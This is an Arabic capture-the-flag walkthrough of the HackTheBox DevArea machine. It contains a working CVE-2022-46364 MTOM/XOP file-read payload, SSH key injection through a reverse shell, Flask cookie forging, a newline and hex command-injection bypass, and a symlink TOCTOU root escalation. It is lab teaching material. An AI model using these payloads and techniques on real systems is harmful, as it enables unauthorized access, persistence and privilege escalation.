CVE-2022-46364 — MTOM XOP File Read

ثغرة Apache CXF لقراءة ملفات النظام

Apache CXF الضعيفة أمام CVE-2022-46364 تسمح بقراءة ملفات عشوائية عبر MTOM/XOP. نُنشئ ملف payload.xml ثم نُرسله لقراءة ملفات النظام الحساسة:

الخطوة 3.1 — إنشاء ملف payload.xml:

ATTACKERإنشاء payload.xml
cat > payload.xml << 'EOF'
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <r@r>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:dev="http://devarea.htb/"
  xmlns:xop="http://www.w3.org/2004/08/xop/include">
<soapenv:Header/><soapenv:Body><dev:submitReport><arg0>
  <confidential>false</confidential>
  <content><xop:Include href="file:///etc/systemd/system/hoverfly.service"/></content>
  <department>IT</department><employeeName>poc</employeeName>
</arg0></dev:submitReport></soapenv:Body></soapenv:Envelope>
--MIMEBoundary--
EOF

الخطوة 3.2 — إرسال الطلب وفك ترميز النتيجة:

ATTACKERاستغلال CVE-2022-46364 — قراءة hoverfly.service

Hoverfly — JWT Login + Middleware RCE

مفتاح SSH — التوليد والحقن والاتصال

نولّد المفتاح على Kali ونحقن الـ public key عبر الـ reverse shell

الفكرة: نولّد زوج المفاتيح على Kali، نأخذ الـ public key ونحقنه في ~/.ssh/authorized_keys على الهدف عبر الـ reverse shell، ثم نتصل بـ SSH باستخدام الـ private key.

 Kali — توليد المفتاح ونسخ الـ public key 
# سطر واحد — بدون backslash
ssh-keygen -t ed25519 -f ~/.ssh/htb_devarea -N ""
Your identification has been saved in /root/.ssh/htb_devarea
Your public key has been saved in /root/.ssh/htb_devarea.pub

# نعرض الـ public key وننسخ الناتج كاملاً
cat ~/.ssh/htb_devarea.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@kali
 Reverse Shell (dev_ryan) — حقن الـ public key 
# داخل الـ reverse shell من الخطوة 4
dev_ryan@devarea:~$ mkdir -p ~/.ssh
dev_ryan@devarea:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@kali" >> ~/.ssh/authorized_keys
dev_ryan@devarea:~$ chmod 600 ~/.ssh/authorized_keys
# تم حقن الـ public key!
 Kali — الاتصال بـ SSH 
chmod 600 ~/.ssh/htb_devarea
ssh -i ~/.ssh/htb_devarea dev_ryan@10.129.244.208
Welcome to Ubuntu 24.04.4 LTS
dev_ryan@devarea:~$

⚠ مهم: لا تستخدم \ مع ssh-keygen في الطرفية — اكتب الأمر بسطر واحد وإلا ستظهر dquote> ويفشل.

شرح السكربت — exploit_root.py

كيف يعمل كل جزء من الكود بالتفصيل

السكربت مكتوب بـ Python 3 بدون أي مكتبات خارجية. الهدف: تنفيذ الاستغلال الكامل بأمر واحد من جهاز المهاجم.

رأس الملف — هوية المبرمج والإعداد

exploit_root.py — Header + Config
"""
HTB DevArea - Full Privilege Escalation: dev_ryan -> root
==========================================================
Author  : joudi
Tool    : exploit_root.py
Platform: HackTheBox — DevArea (Medium/Linux)
==========================================================
"""

TARGET   = "10.129.244.208"   # IP الجهاز المستهدف
SSH_USER = "dev_ryan"
SECRET   = "f3ac48a6..."       # Flask SECRET_KEY من /etc/syswatch.env

الدوال الرئيسية

ATTACKER _find_key()

تبحث تلقائياً عن مفتاح SSH في مسارات متعددة (Windows وLinux):

  • C:\Users\hahsh\.ssh\htb_devarea — Windows
  • ~/.ssh/htb_devarea — Linux/Mac
  • /root/.ssh/htb_devarea — root على Linux

إذا لم يجد المفتاح يطبع خطأ واضحاً ويوقف البرنامج.

ATTACKER → TARGET check_ssh()

يتأكد من أن الاتصال بـ SSH يعمل قبل أي شيء. يُرسل echo ok ويتحقق من الرد. إذا فشل يوقف البرنامج فوراً.

ATTACKER forge_cookie()

تُعيد بناء كوكي Flask session صالحة بدون تثبيت Flask. تُحاكي آلية تشفير Flask 3.x / itsdangerous 2.x:

  • JSON encode: {"user_id": 1, "username": "admin"}
  • Compress + Base64: zlib ثم base64 URL-safe مع البادئة .
  • Timestamp: Unix time كـ 4 bytes big-endian (itsdangerous 2.x)
  • Key derivation: HMAC-SHA1(SECRET, "cookie-session")
  • Signature: HMAC-SHA1(derived_key, data + "." + timestamp)

الناتج: كوكي صالحة مثل .eJyr...data....timestamp.signature

TARGET — syswatch uid=984 inject(bash_cmd)

تُنفذ أي أمر bash على الهدف كـ syswatch (uid=984) عبر حقن أوامر في /service-status:

  • الثغرة: SysWatch يمرر قيمة service مباشرة لـ shell
  • Regex يحجب: ; / & . < > A-Z لكن لا يحجب \n
  • newline bypass: service=syswatch%0a$(cmd) يصبح سطرين
  • hex encoding: الأمر يُحوَّل لـ hex بـ xxd -p لتجنب الأحرف المحجوبة
مثال — تصور البايلود
# الأمر: id
hex = "6964"   # 'id' بالـ hex
payload = "service=syswatch\n$(echo 6964 | xxd -r -p | bash)"
# الـ shell يرى:
systemctl status syswatch
$(echo 6964 | xxd -r -p | bash)
# ينفذ: id  ->  uid=984(syswatch)
TARGET — syswatch يملك /opt/syswatch/logs/ Double Symlink TOCTOU — الخطوات 3 و4

استغلال ثغرة التحقق في syswatch.sh:

  • symlink عميق: /opt/syswatch/logs/target → ../../../root/root.txt
  • symlink سطحي: /opt/syswatch/logs/reader.log → target
  • لماذا ينجح؟ readlink reader.log يُعيد "target" (اسم بسيط، بدون / أو ..) فيُجتاز التحقق
  • لكن cat reader.log يتبع السلسلة كاملة: reader.log → target → /root/root.txt
تصور سلسلة الـ symlinks
/opt/syswatch/logs/
├── reader.log  ──symlink──►  target
└── target      ──symlink──►  ../../../root/root.txt
                                    │
                                    ▼
                            /root/root.txt  ✓
TARGET — يُنفَّذ كـ ROOT sudo /opt/syswatch/syswatch.sh logs reader.log

الخطوة الحاسمة:

  • dev_ryan يملك sudo على syswatch.sh بدون كلمة مرور
  • السكربت يتحقق: readlink(reader.log) = "target" → قبول (لا يحتوي / أو ..)
  • ثم ينفذ cat /opt/syswatch/logs/reader.log كـ root
  • cat يتبع: reader.log → target → /root/root.txt → يطبع العلم!
